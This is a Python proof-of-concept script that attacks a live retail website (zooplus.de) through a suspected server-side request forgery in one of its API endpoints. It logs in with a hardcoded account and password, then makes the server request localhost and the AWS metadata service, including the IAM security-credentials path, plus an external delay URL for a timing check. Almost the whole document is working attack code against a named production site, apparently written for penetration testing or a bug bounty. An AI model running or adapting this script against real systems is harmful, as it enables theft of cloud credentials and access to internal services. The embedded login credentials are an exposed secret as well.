#!/usr/bin/env python3
"""Test all 4 methods for 100% SSRF proof"""
import requests
import json
import re
import urllib.parse
import time
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "*/*",
})

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

ssrf_endpoint = "/zootopia-events/api/events/sites/1"

print("="*70)
print("Testing ALL 4 methods for 100% SSRF proof")
print("="*70)

all_proofs = []

# METHOD 1: Custom Internal Header (ALREADY WORKED)
print("\n[1] METHOD 1: Custom Internal Header")
try:
    resp = s.post(f"{base}{ssrf_endpoint}", json={
        "url": "http://127.0.0.1:8080",
        "headers": {"X-Internal-Test": "SSRF-POC-2025"}
    }, timeout=10, verify=False)
    
    found_headers = []
    for key, value in resp.headers.items():
        key_lower = key.lower()
        if any(x in key_lower for x in ['x-internal-test', 'x-request-id', 'x-trace-id', 'server']):
            found_headers.append((key, value))
            print(f"  ✅ FOUND: {key}: {value}")
    
    if found_headers:
        all_proofs.append({"method": 1, "type": "header_reflection", "headers": dict(found_headers), "status": "SUCCESS"})
except Exception as e:
    print(f"  [ERROR] {e}")

# METHOD 2: Custom User-Agent Reflection
print("\n[2] METHOD 2: Custom User-Agent Reflection")
try:
    custom_ua = "SSRF-EXPLOIT-BY-PENTEST-2025"
    s2 = requests.Session()
    s2.headers.update({"User-Agent": custom_ua, "Accept": "*/*"})
    s2.cookies.update(s.cookies)
    
    resp = s2.post(f"{base}{ssrf_endpoint}", json={
        "url": "http://169.254.169.254/latest/meta-data/instance-id"
    }, timeout=10, verify=False)
    
    if custom_ua in resp.text or custom_ua in str(resp.headers):
        print(f"  ✅ FOUND: Custom User-Agent reflected!")
        all_proofs.append({"method": 2, "type": "user_agent_reflection", "status": "SUCCESS"})
    else:
        print(f"  [INFO] Custom UA not reflected")
        all_proofs.append({"method": 2, "type": "user_agent_reflection", "status": "NO_REFLECTION"})
except Exception as e:
    print(f"  [ERROR] {e}")

# METHOD 3: Time-based Confirmation
print("\n[3] METHOD 3: Time-based Confirmation")
try:
    # Internal
    start1 = time.time()
    resp1 = s.post(f"{base}{ssrf_endpoint}", json={
        "url": "http://169.254.169.254/latest/meta-data/instance-id"
    }, timeout=10, verify=False)
    time1 = (time.time() - start1) * 1000
    
    # External with delay
    start2 = time.time()
    resp2 = s.post(f"{base}{ssrf_endpoint}", json={
        "url": "https://httpbin.org/delay/5"
    }, timeout=10, verify=False)
    time2 = (time.time() - start2) * 1000
    
    print(f"  Internal: {time1:.2f}ms")
    print(f"  External: {time2:.2f}ms")
    
    if time1 < 200 and time2 > 3000:
        print(f"  ✅ PROOF: Time difference confirms SSRF!")
        all_proofs.append({"method": 3, "type": "time_based", "internal_ms": time1, "external_ms": time2, "status": "SUCCESS"})
    else:
        print(f"  [INFO] Time difference: {time2 - time1:.2f}ms")
        all_proofs.append({"method": 3, "type": "time_based", "internal_ms": time1, "external_ms": time2, "status": "PARTIAL"})
except Exception as e:
    print(f"  [ERROR] {e}")

# METHOD 4: Get Real AWS Metadata Data
print("\n[4] METHOD 4: Get Real AWS Metadata Data")
try:
    resp = s.post(f"{base}{ssrf_endpoint}", json={
        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "method": "GET",
        "headers": {"Accept": "text/plain"}
    }, timeout=10, verify=False)
    
    response_text = resp.text.strip()
    if response_text and response_text != "{}" and len(response_text) > 10:
        if not response_text.startswith("<!DOCTYPE"):
            print(f"  ✅ FOUND: Real AWS data: {response_text[:50]}")
            all_proofs.append({"method": 4, "type": "aws_metadata_data", "data": response_text, "status": "SUCCESS"})
        else:
            print(f"  [INFO] HTML response")
            all_proofs.append({"method": 4, "type": "aws_metadata_data", "status": "NO_DATA"})
    else:
        print(f"  [INFO] Empty response (Blind SSRF)")
        all_proofs.append({"method": 4, "type": "aws_metadata_data", "status": "BLIND_SSRF"})
except Exception as e:
    print(f"  [ERROR] {e}")

# Save all proofs
with open("logs/all_methods_proof.json", "w") as f:
    json.dump({"timestamp": datetime.now().isoformat(), "proofs": all_proofs}, f, indent=2)

print("\n" + "="*70)
print(f"Total proofs: {len([p for p in all_proofs if p.get('status') == 'SUCCESS'])}")
print("="*70)





